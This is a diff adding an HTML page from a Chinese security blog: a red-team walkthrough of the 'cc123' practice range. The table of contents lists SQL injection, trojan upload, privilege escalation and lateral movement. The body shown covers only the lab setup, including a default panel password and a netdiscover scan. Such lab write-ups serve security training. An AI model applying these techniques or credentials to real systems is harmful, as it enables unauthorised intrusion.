@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>红队实战之Cc123 - T0x1c</title>
+
+  
+    <meta name="description" content="cc123靶场主要为多级网段获取权限，其中涉及多种技术，包括子域名探测、SQL注入、烂土豆提权、MSSQL提权、.NET代码审计、内网渗透等知识。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队实战之Cc123">
+<meta property="og:url" content="https://toxic80l.github.io/post/87eb37a9/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="cc123靶场主要为多级网段获取权限，其中涉及多种技术，包括子域名探测、SQL注入、烂土豆提权、MSSQL提权、.NET代码审计、内网渗透等知识。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%2022.02.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8A%E5%8D%883.51.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8B%E5%8D%8810.13.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8B%E5%8D%8810.18.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%2022.15.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.20.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.35.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.05.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.26.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.39.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.35.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.44.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.45.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.18.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%20%E4%B8%8A%E5%8D%883.03.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.23.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.26.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.27.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.34.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.36.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.37.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.37.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.40.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.55.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.55.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.26.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.27.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.35.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%20%E4%B8%8B%E5%8D%8811.40.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.41.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.44.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.46.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2000.03.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2000.09.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2002.33.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.23.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.24.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.15.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.12.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.49.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.51.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.51.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2021.46.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2021.48.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2022.21.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2022.22.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-28%20%E4%B8%8B%E5%8D%8810.46.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2004.18.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2003.59.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2004.01.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2004.19.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.16.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.28.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.50.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2000.45.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2002.51.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.01.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.05.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.28.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.34.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-01%2002.57.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.02.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.19.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.25.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.45.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.46.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.58.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2001.15.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.23.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.28.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.44.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.50.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.51.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.40.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.53.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.55.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.57.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2004.54.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2004.55.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.00.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.03.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.06.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.10.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.11.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.11.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2014.58.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.02.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.51.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.11.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.30.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.31.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.35.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.54.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.02.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.03.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.23.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.25.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.08.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.15.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.58.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.33.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.35.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.59.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2017.03.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.20.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.44.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.49.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.53.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.58.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.02.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.05.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.06.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.11.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.14.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.15.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2020.00.17.png">
+<meta property="article:published_time" content="2022-06-04T12:34:57.000Z">
+<meta property="article:modified_time" content="2022-06-17T00:46:31.852Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="DEDECMS">
+<meta property="article:tag" content="GrCMS">
+<meta property="article:tag" content="MSF">
+<meta property="article:tag" content="Phpstudy">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%2022.02.28.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x01 靶机环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4"><span class="toc-text">0x02 外网边界突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#999%E7%AB%AF%E5%8F%A3"><span class="toc-text">999端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6588%E7%AB%AF%E5%8F%A3"><span class="toc-text">6588端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F"><span class="toc-text">子域名扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-new%E5%AD%90%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">0x03 new子域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DedeCMS%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">DedeCMS前台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DedeCMS%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="toc-text">DedeCMS后台上传木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS16-075%E7%83%82%E5%9C%9F%E8%B1%86%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-text">MS16-075烂土豆内核提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-ww2%E5%AD%90%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">0X04 ww2子域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GrCMS%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">GrCMS后台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GrCMS-NET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">GrCMS.NET代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%87%8D%E7%94%A8"><span class="toc-text">验证码重用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">后台SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">后台编辑器文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS"><span class="toc-text">前台XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86"><span class="toc-text">后台用户密码解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">0x05 内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">基础环境信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bsocks%E4%BB%A3%E7%90%86"><span class="toc-text">建立socks代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">渗透数据库服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">渗透目标服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-text">0x06 总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-06-04T12:34:57.000Z">2022-06-04</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>红队实战之Cc123</span></h1>
+<p>cc123靶场主要为多级网段获取权限，其中涉及多种技术，包括子域名探测、SQL注入、烂土豆提权、MSSQL提权、.NET代码审计、内网渗透等知识。<span id="more"></span></p>
+<h2 id="0x01-靶机环境搭建"><a href="#0x01-靶机环境搭建" class="headerlink" title="0x01 靶机环境搭建"></a>0x01 靶机环境搭建</h2><p>靶场中包含三台靶机，我们的目标是需要渗透整个网段并拿到四个flag。具体的网络拓扑图如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%2022.02.28.png" alt="截屏2022-05-24 22.02.28"></p>
+<p>在虚拟网络编辑器中创建两个主机网段<code>10.10.10.0/24</code>、<code>10.10.1.0/24</code>，分别将其命名为<code>VMnet18</code>、<code>VMnet19</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8A%E5%8D%883.51.24.png" alt="截屏2022-05-24 上午3.51.24"></p>
+<p>完成后分别为查看三台靶机的主机网卡，靶机中已经完成网卡设置<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8B%E5%8D%8810.13.08.png" alt="截屏2022-05-24 下午10.13.08"></p>
+<p>护卫神主机管理员的默认密码为<code>!@#Qwe123.</code>，登录后查看IP地址为<code>192.168.0.134</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%20%E4%B8%8B%E5%8D%8810.18.09.png" alt="截屏2022-05-24 下午10.18.09"></p>
+<p>如果不登录查看的话也可以使用 netdiscover 发现内网主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<p>正常访问目标站点，说明环境成功搭建完成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-24%2022.15.47.png" alt="截屏2022-05-24 22.15.47"></p>
+<p>接下来需要在 hosts 文件中绑定域名解析</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置</span></span></span><br><span class="line">192.168.0.134 www.cc123.com</span><br></pre></td></tr></table></figure>
